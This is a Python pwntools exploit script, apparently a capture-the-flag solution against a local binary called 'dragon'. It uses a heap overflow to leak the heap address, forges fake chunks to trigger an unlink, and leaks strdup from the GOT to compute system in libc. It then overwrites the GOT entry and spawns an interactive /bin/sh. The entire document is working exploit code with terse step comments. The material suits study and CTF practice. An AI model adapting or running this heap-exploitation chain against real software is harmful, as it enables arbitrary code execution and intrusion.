from pwn import *

def new(p, name_size, name, content):
	p.recvuntil(">>")
	p.sendline('1')
	p.recvuntil('name size:')
	p.sendline(str(name_size))
	if name_size > 32:
		return
	p.recvuntil('name:')
	p.send(name)
	p.recvuntil('content:')
	p.send(content)
	
def edit(p, nid, content):
	p.recvuntil(">>")
	p.sendline('2')
	p.recvuntil('id:')
	p.sendline(str(nid))
	p.recvuntil('content:')
	p.send(content)
	
def delete(p, nid):
	p.recvuntil(">>")
	p.sendline('3')
	p.recvuntil('id:')
	p.sendline(str(nid))
	
def show(p, nid):
	p.recvuntil(">>")
	p.sendline('4')
	p.recvuntil('id:')
	p.sendline(str(nid))
	
p = process('./dragon')

#step 1. leak heap addr
new(p, 16, 'a'*15+'\n', 'b'*15 + '\n')
new(p, 16, 'c'*15+'\n', 'd'*15 + '\n')

#heap overflow here
edit(p, 0, 'e'*32) 
show(p, 0)
p.recvuntil('e'*32)
heap_base = u64(p.recvline()[:-1].ljust(8, '\0')) - 0x90
print 'Got heap_base:', hex(heap_base)

#step 2. clear data
edit(p, 0, 'e'*16 + p64(0) + p64(0x21))
delete(p, 0)
delete(p, 1)
new(p, 50, '', '')
new(p, 50, '', '')
new(p, 50, '', '')
new(p, 50, '', '')

unlink_addr = heap_base + 0xe0
#step 3. make a fake heap
new(p, 32, 'a'*32, 'b'*15 + '\n')
new(p, 32, 'a'*31+'\n', '/bin/sh' + '\n')
new(p, 32, 'a'*31+'\n', 'b'*15 + '\n')
new(p, 32, 'a'*31+'\n', 'b'*15 + '\n')
new(p, 32, p64(0xa0) + p64(0x21) + 'a'*16, 'b'*15 + '\n')
edit(p, 0, p64(0) + p64(0xf1) + p64(unlink_addr - 0x18) + p64(unlink_addr - 0x10))
edit(p, 2, 'a'*16 + p64(0xf0) + p64(0xa0))

#step 4. trigger unlink
delete(p, 3)

#step 5. leak address of strdup
binf = ELF('./dragon')
edit(p, 0, 'a'*8 + p64(heap_base + 0xf0) + 'b'*8 + p64(binf.got['strdup']))
show(p, 0)
p.recvuntil('content:')
free_addr = u64(p.recvline()[1:-1].ljust(8, '\0'))
print 'strdup addr is ', hex(free_addr)

libc = ELF('/lib/x86_64-linux-gnu/libc-2.24.so')
system_addr = free_addr + libc.symbols['system'] - libc.symbols['strdup']
print 'system addr is ', hex(system_addr)

#step 6. rewrite system address into GOT table of strdup
edit(p, 0, p64(system_addr) + '\n')
delete(p, 2)
#gdb.attach(p, open('debug'))

#step 7. get shell
new(p, 16, 'a'*15+'\n', '/bin/sh' + '\n')
p.interactive()
